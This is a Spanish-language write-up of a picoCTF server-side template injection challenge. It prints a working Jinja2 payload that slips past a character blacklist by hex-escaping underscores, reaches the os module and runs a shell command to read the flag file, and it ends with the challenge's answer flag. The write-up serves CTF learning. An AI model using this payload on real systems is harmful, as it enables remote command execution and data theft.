## **Descripción**
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)

Additional details will be available after launching your challenge instance.
## Hints
1. Server Side Template Injection
2. Why is blacklisting characters a bad idea to sanitize input?
## **Solución** 
Para este reto haremos lo siguiente:
- Al parecer tendremos que hacer una inyección SSTI, el reto es similar al SSTI1, esta consiste en Un ataque de inyección de plantilla del lado del servidor.
- Para saber de que tipo de plantilla utilizamos cierto criterio que es ingresar parámetros, para este caso utilizamos {{7*7}} en este caso esto funciona para plantillas twing en python.
- Una vez detectada la plantilla procedemos a buscar payloads que nos permitan vulnerar el sistema.
- Para este caso vamos a utilizar el siguiente payload: 
`{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}`

- La cadena completa está intentando lo siguiente:
1. Obtener el objeto `request` (probablemente desde una solicitud HTTP).
2. Acceder al atributo `application` de `request`, lo cual puede ser utilizado para obtener el entorno o contexto de la aplicación.
3. Acceder al diccionario de variables globales en Python a través de `__globals__`.
4. Desde los `__globals__`, acceder a `__builtins__` (las funciones y objetos incorporados).
5. Usar `__import__` para importar el módulo `os`.
6. Usar `os.popen('cat flag')` para ejecutar el comando del sistema `cat flag`, que intentará leer el archivo `flag`.
7. Llamar a `read()` para leer el contenido de la salida del comando `cat flag` y obtener el contenido de ese archivo.
Si colocamos la plantilla en caja de texto esta nos redireccionara a la bandera.

```
 picoCTF{sst1_f1lt3r_byp4ss_eb2a60e7}
```

## **Notas adicionales**

## **Referencias**
1. 